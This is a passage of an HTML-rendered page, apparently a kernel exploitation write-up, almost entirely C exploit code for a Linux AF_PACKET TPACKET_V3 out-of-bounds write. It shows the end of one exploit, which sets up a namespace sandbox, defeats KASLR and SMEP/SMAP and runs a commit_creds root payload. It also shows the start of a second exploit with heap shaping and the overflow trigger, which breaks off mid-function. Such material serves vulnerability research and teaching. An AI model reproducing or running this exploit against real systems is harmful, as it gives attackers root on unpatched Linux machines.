class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!write_file(<span class="string">&quot;/proc/self/setgroups&quot;</span>, <span class="string">&quot;deny&quot;</span>)) &#123;</span><br><span class="line">		perror(<span class="string">&quot;[-] write_file(/proc/self/set_groups)&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (!write_file(<span class="string">&quot;/proc/self/uid_map&quot;</span>, <span class="string">&quot;0 %d 1\\n&quot;</span>, real_uid))&#123;</span><br><span class="line">		perror(<span class="string">&quot;[-] write_file(/proc/self/uid_map)&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (!write_file(<span class="string">&quot;/proc/self/gid_map&quot;</span>, <span class="string">&quot;0 %d 1\\n&quot;</span>, real_gid)) &#123;</span><br><span class="line">		perror(<span class="string">&quot;[-] write_file(/proc/self/gid_map)&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="type">cpu_set_t</span> my_set;</span><br><span class="line">	CPU_ZERO(&amp;my_set);</span><br><span class="line">	CPU_SET(<span class="number">0</span>, &amp;my_set);</span><br><span class="line">	<span class="keyword">if</span> (sched_setaffinity(<span class="number">0</span>, <span class="keyword">sizeof</span>(my_set), &amp;my_set) != <span class="number">0</span>) &#123;</span><br><span class="line">		perror(<span class="string">&quot;[-] sched_setaffinity()&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (system(<span class="string">&quot;/sbin/ifconfig lo up&quot;</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">		perror(<span class="string">&quot;[-] system(/sbin/ifconfig lo up)&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[.] starting\\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	setup_sandbox();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[.] namespace sandbox set up\\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ENABLE_KASLR_BYPASS</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[.] KASLR bypass enabled, getting kernel addr\\n&quot;</span>);</span><br><span class="line">	KERNEL_BASE = get_kernel_addr();</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[.] done, kernel text:   %lx\\n&quot;</span>, KERNEL_BASE);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[.] commit_creds:        %lx\\n&quot;</span>, KERNEL_BASE + COMMIT_CREDS);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[.] prepare_kernel_cred: %lx\\n&quot;</span>, KERNEL_BASE + PREPARE_KERNEL_CRED);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ENABLE_SMEP_SMAP_BYPASS</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[.] native_write_cr4:    %lx\\n&quot;</span>, KERNEL_BASE + NATIVE_WRITE_CR4);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[.] padding heap\\n&quot;</span>);</span><br><span class="line">	kmalloc_pad(KMALLOC_PAD);</span><br><span class="line">	pagealloc_pad(PAGEALLOC_PAD);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[.] done, heap is padded\\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ENABLE_SMEP_SMAP_BYPASS</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[.] SMEP &amp; SMAP bypass enabled, turning them off\\n&quot;</span>);</span><br><span class="line">  getchar();</span><br><span class="line">	oob_timer_execute((<span class="type">void</span> *)(KERNEL_BASE + NATIVE_WRITE_CR4), CR4_DESIRED_VALUE);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[.] done, SMEP &amp; SMAP should be off now\\n&quot;</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[.] executing get root payload %p\\n&quot;</span>, &amp;get_root_payload);</span><br><span class="line">  getchar();</span><br><span class="line">	oob_id_match_execute((<span class="type">void</span> *)&amp;get_root_payload);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[.] done, should be root now\\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	check_root();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>) sleep(<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="exp2"><a href="#exp2" class="headerlink" title="exp2"></a>exp2</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/klog.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/resource.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/udp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/ip.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/xfrm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/netlink.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/if_packet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/if_ether.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;net/if.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;keyutils.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/uio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGESIZE 4096</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KMALLOC_PAD 512</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGEALLOC_PAD 1024</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">packet_socket_rx_ring_init</span><span class="params">(<span class="type">int</span> s, <span class="type">unsigned</span> <span class="type">int</span> block_size,</span></span><br><span class="line"><span class="params">		<span class="type">unsigned</span> <span class="type">int</span> frame_size, <span class="type">unsigned</span> <span class="type">int</span> block_nr,</span></span><br><span class="line"><span class="params">		<span class="type">unsigned</span> <span class="type">int</span> sizeof_priv, <span class="type">unsigned</span> <span class="type">int</span> timeout)</span> &#123;</span><br><span class="line">	<span class="comment">// specify using TPACKET_V3 version cause this vulnerability</span></span><br><span class="line">	<span class="comment">// only impacts this verison</span></span><br><span class="line">	<span class="type">int</span> v = TPACKET_V3;</span><br><span class="line">	<span class="type">int</span> rv = setsockopt(s, SOL_PACKET, PACKET_VERSION, &amp;v, <span class="keyword">sizeof</span>(v));</span><br><span class="line">	<span class="keyword">if</span> (rv &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		perror(<span class="string">&quot;[-] setsockopt(PACKET_VERSION)&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req3</span> <span class="title">req</span>;</span></span><br><span class="line">	<span class="built_in">memset</span>(&amp;req, <span class="number">0</span>, <span class="keyword">sizeof</span>(req));</span><br><span class="line">	req.tp_block_size = block_size; <span class="comment">// 0x1000</span></span><br><span class="line">	req.tp_frame_size = frame_size;	<span class="comment">// 0x1000</span></span><br><span class="line">	req.tp_block_nr = block_nr; <span class="comment">// 0x1</span></span><br><span class="line">	req.tp_frame_nr = (block_size * block_nr) / frame_size;</span><br><span class="line">	req.tp_retire_blk_tov = timeout;</span><br><span class="line">	<span class="comment">// (1u&lt;&lt;31) + (1u&lt;&lt;30) + 0x8000 - BLK_HDR_LEN - macoff + offset</span></span><br><span class="line">	req.tp_sizeof_priv = sizeof_priv;</span><br><span class="line">	req.tp_feature_req_word = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// vulnerability happens in this system call</span></span><br><span class="line">	rv = setsockopt(s, SOL_PACKET, PACKET_RX_RING, &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line">	<span class="keyword">if</span> (rv &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		perror(<span class="string">&quot;[-] setsockopt(PACKET_RX_RING)&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">packet_socket_setup</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> block_size, <span class="type">unsigned</span> <span class="type">int</span> frame_size,</span></span><br><span class="line"><span class="params">		<span class="type">unsigned</span> <span class="type">int</span> block_nr, <span class="type">unsigned</span> <span class="type">int</span> sizeof_priv, <span class="type">int</span> timeout)</span> &#123;</span><br><span class="line">	<span class="comment">// create a AF_PACKET socket</span></span><br><span class="line">	<span class="type">int</span> s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));</span><br><span class="line">	<span class="keyword">if</span> (s &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		perror(<span class="string">&quot;[-] socket(AF_PACKET)&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	packet_socket_rx_ring_init(s, block_size, frame_size, block_nr,</span><br><span class="line">		sizeof_priv, timeout);</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_ll</span> <span class="title">sa</span>;</span></span><br><span class="line">	<span class="built_in">memset</span>(&amp;sa, <span class="number">0</span>, <span class="keyword">sizeof</span>(sa));</span><br><span class="line">	sa.sll_family = PF_PACKET;</span><br><span class="line">	sa.sll_protocol = htons(ETH_P_ALL);</span><br><span class="line">	sa.sll_ifindex = if_nametoindex(<span class="string">&quot;lo&quot;</span>);</span><br><span class="line">	sa.sll_hatype = <span class="number">0</span>;</span><br><span class="line">	sa.sll_pkttype = <span class="number">0</span>;</span><br><span class="line">	sa.sll_halen = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> rv = bind(s, (<span class="keyword">struct</span> sockaddr *)&amp;sa, <span class="keyword">sizeof</span>(sa));</span><br><span class="line">	<span class="keyword">if</span> (rv &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		perror(<span class="string">&quot;[-] bind(AF_PACKET)&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">packet_socket_send</span><span class="params">(<span class="type">int</span> s, <span class="type">char</span> *buffer, <span class="type">int</span> size)</span> &#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_ll</span> <span class="title">sa</span>;</span></span><br><span class="line">	<span class="built_in">memset</span>(&amp;sa, <span class="number">0</span>, <span class="keyword">sizeof</span>(sa));</span><br><span class="line">	sa.sll_ifindex = if_nametoindex(<span class="string">&quot;lo&quot;</span>);</span><br><span class="line">	sa.sll_halen = ETH_ALEN;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (sendto(s, buffer, size, <span class="number">0</span>, (<span class="keyword">struct</span> sockaddr *)&amp;sa,</span><br><span class="line">			<span class="keyword">sizeof</span>(sa)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		perror(<span class="string">&quot;[-] sendto(SOCK_RAW)&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">loopback_send</span><span class="params">(<span class="type">char</span> *buffer, <span class="type">int</span> size)</span> &#123;</span><br><span class="line">	<span class="type">int</span> s = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);</span><br><span class="line">	<span class="keyword">if</span> (s == <span class="number">-1</span>) &#123;</span><br><span class="line">		perror(<span class="string">&quot;[-] socket(SOCK_RAW)&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	packet_socket_send(s, buffer, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">packet_sock_kmalloc</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">int</span> s = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));</span><br><span class="line">	<span class="keyword">if</span> (s == <span class="number">-1</span>) &#123;</span><br><span class="line">		perror(<span class="string">&quot;[-] socket(SOCK_DGRAM)&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">packet_sock_timer_schedule</span><span class="params">(<span class="type">int</span> s, <span class="type">int</span> timeout)</span> &#123;</span><br><span class="line">	packet_socket_rx_ring_init(s, <span class="number">0x1000</span>, <span class="number">0x1000</span>, <span class="number">1</span>, <span class="number">0</span>, timeout);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">packet_sock_id_match_trigger</span><span class="params">(<span class="type">int</span> s)</span> &#123;</span><br><span class="line">	<span class="type">char</span> buffer[<span class="number">16</span>];</span><br><span class="line">	packet_socket_send(s, &amp;buffer[<span class="number">0</span>], <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// * * * * * * * * * * * * * * * Trigger * * * * * * * * * * * * * * * * * *</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ALIGN(x, a)			__ALIGN_KERNEL((x), (a))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __ALIGN_KERNEL(x, a)		__ALIGN_KERNEL_MASK(x, (typeof(x))(a) - 1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __ALIGN_KERNEL_MASK(x, mask)	(((x) + (mask)) &amp; ~(mask))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> V3_ALIGNMENT	(8)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BLK_HDR_LEN	(ALIGN(sizeof(struct tpacket_block_desc), V3_ALIGNMENT))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ETH_HDR_LEN	sizeof(struct ethhdr)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IP_HDR_LEN	sizeof(struct iphdr)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UDP_HDR_LEN	sizeof(struct udphdr)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UDP_HDR_LEN_FULL	(ETH_HDR_LEN + IP_HDR_LEN + UDP_HDR_LEN)</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">oob_setup</span><span class="params">(<span class="type">int</span> offset)</span> &#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> maclen = ETH_HDR_LEN;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> netoff = TPACKET_ALIGN(TPACKET3_HDRLEN +</span><br><span class="line">				(maclen &lt; <span class="number">16</span> ? <span class="number">16</span> : maclen));</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> macoff = netoff - maclen;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> sizeof_priv = (<span class="number">1u</span>&lt;&lt;<span class="number">31</span>) + (<span class="number">1u</span>&lt;&lt;<span class="number">30</span>) +</span><br><span class="line">		<span class="number">0x8000</span> - BLK_HDR_LEN - macoff + offset;</span><br><span class="line">	<span class="keyword">return</span> packet_socket_setup(<span class="number">0x8000</span>, <span class="number">2048</span>, <span class="number">2</span>, sizeof_priv, <span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">oob_write</span><span class="params">(<span class="type">char</span> *buffer, <span class="type">int</span> size)</span> &#123;</span><br><span class="line">	loopback_send(buffer, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// * * * * * * * * * * * * * * Heap shaping * * * * * * * * * * * * * * * * *</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">kmalloc_pad</span><span class="params">(<span class="type">int</span> count)</span> &#123;</span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; count; i++)</span><br><span class="line">		packet_sock_kmalloc();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pagealloc_pad</span><span class="params">(<span class="type">int</span> count)</span> &#123;</span><br><span class="line">	packet_socket_setup(<span class="number">0x8000</span>, <span class="number">2048</span>, count, <span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">write_file</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* file, <span class="type">const</span> <span class="type">char</span>* what, ...)</span> &#123;</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">1024</span>];</span><br><span class="line">	va_list args;</span><br><span class="line">	va_start(args, what);</span><br><span class="line">	vsnprintf(buf, <span class="keyword">sizeof</span>(buf), what, 